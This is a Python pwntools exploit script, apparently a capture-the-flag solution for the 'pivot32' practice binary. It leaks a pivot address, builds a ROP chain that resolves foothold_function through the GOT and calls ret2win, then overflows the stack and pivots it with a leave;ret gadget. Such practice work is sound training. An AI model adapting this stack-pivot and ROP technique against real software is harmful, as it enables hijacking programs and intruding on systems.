#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version avec appel de call eax

# ret : *pwnme+198
# read : *pwnme+172
gs='''
b *pwnme+198
c
'''
# Set up pwntools for the correct architecture
elf =  ELF('pivot32')
context.binary=elf

libelf = ELF('libpivot32.so')

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']

lib_foothold = libelf.symbols['foothold_function']
lib_re2win = libelf.symbols['ret2win']
off_ret2win=lib_re2win-lib_foothold


# Les gadgets

# pop eax; ret
g_pop_eax=0x804882c

# mov eax, dword ptr [eax] ; ret 
g_mov_eax_eax = 0x8048830

# pop ebx ; ret
g_pop_ebx=0x80484a9

# add eax, ebx ; ret
g_add_eax_ebx=0x8048833

# call eax
g_call_eax = 0x80485f0

# leave; ret
g_leave = 0x080485f5


io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")
log.info(f"{plt_foothold=:x}")
log.info(f"{got_foothold=:x}")
log.info(f"offset ret2win = 0x{off_ret2win}")

# Message 1 
# ROP chaine d'exploitation
PL=b''
PL+=p32(plt_foothold)
PL+=p32(g_pop_eax)              # pop eax 
PL+=p32(got_foothold)
PL+=p32(g_mov_eax_eax)
PL+=p32(g_pop_ebx)
PL+=p32(off_ret2win)
PL+=p32(g_add_eax_ebx)
PL+=p32(g_call_eax)

io.sendlineafter(b"> ",PL)

# Message 2 : pivot
# Offset avant ecrasement de l'adresse de EBP
offset=0x28

PL =b"A"*offset
PL+=p32(leak-4)     # pour SEBP
PL+=p32(g_leave)    # pour SEIP
io.sendlineafter(b"> ",PL)

io.interactive()

